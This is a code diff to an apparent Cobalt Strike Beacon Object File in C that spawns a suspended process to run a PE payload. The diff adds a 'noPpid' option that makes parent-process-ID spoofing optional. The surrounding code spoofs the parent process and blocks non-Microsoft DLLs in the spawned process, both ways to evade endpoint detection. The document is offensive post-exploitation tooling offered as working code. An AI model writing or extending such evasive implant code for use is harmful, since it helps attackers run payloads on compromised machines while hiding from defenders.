@@ -279,7 +279,7 @@ static void SpawnCleanup(SPAWN_CTX *ctx, BOOL keepProc) {
 }
 
 static BOOL SpawnSuspended(const char *spawntoA, BOOL wantOutput, BOOL blockDlls,
-                           SPAWN_CTX *ctx) {
+                           BOOL noPpid, SPAWN_CTX *ctx) {
     _memset(ctx, 0, sizeof(SPAWN_CTX));
     ctx->si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
 
@@ -316,9 +316,14 @@ static BOOL SpawnSuspended(const char *spawntoA, BOOL wantOutput, BOOL blockDlls
     DWORD64 blockDllsPolicy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
 
     /* PPID spoofing */
-    DWORD parentPid = FindSpoofParent(spawntoA);
-    if (parentPid) {
-        ctx->hParent = KERNEL32$OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);
+    if (!noPpid) {
+        DWORD parentPid = FindSpoofParent(spawntoA);
+        if (parentPid) {
+            ctx->hParent = KERNEL32$OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);
+            if (ctx->hParent) {
+                BeaconPrintf(CALLBACK_OUTPUT, "[+] PPID spoof target: PID %lu", parentPid);
+            }
+        }
     }
 
     /* Attribute count: PPID (if available) + BlockDLLs (if requested) */
@@ -342,7 +347,7 @@ static BOOL SpawnSuspended(const char *spawntoA, BOOL wantOutput, BOOL blockDlls
                     &ctx->hParent, sizeof(HANDLE), NULL, NULL)) {
                 BeaconPrintf(CALLBACK_OUTPUT, "[!] PPID spoof failed (%lu), continuing without", KERNEL32$GetLastError());
             } else {
-                BeaconPrintf(CALLBACK_OUTPUT, "[+] PPID spoofed to PID %lu", parentPid);
+                BeaconPrintf(CALLBACK_OUTPUT, "[+] PPID spoofed");
             }
         }
 
@@ -683,6 +688,7 @@ static BYTE* ReadLocalFile(const char *path, DWORD *outSize) {
  *   int     noOutput      (0=capture, 1=no output)
  *   int     timeout_ms
  *   int     blockDlls     (0=no, 1=yes)
+ *   int     noPpid        (0=spoof, 1=no spoof)
  *   cstr    spawnto       (empty = default)
  *   cstr    args          (PE arguments, can be empty)
  *   cstr    localPath     (if source=1, path on target)
@@ -698,6 +704,7 @@ void go(char *rawArgs, int rawLen) {
     int noOutput   = BeaconDataInt(&parser);
     int timeoutMs  = BeaconDataInt(&parser);
     int blockDlls  = BeaconDataInt(&parser);
+    int noPpid     = BeaconDataInt(&parser);
 
     int spawntoLen = 0;
     char *spawnto  = BeaconDataExtract(&parser, &spawntoLen);
@@ -749,7 +756,7 @@ void go(char *rawArgs, int rawLen) {
 
     /* Create suspended process */
     SPAWN_CTX sctx;
-    if (!SpawnSuspended(spawntoA, wantOutput, blockDlls, &sctx)) {
+    if (!SpawnSuspended(spawntoA, wantOutput, blockDlls, noPpid, &sctx)) {
         if (freePayload) KERNEL32$LocalFree(payloadData);
         return;
     }
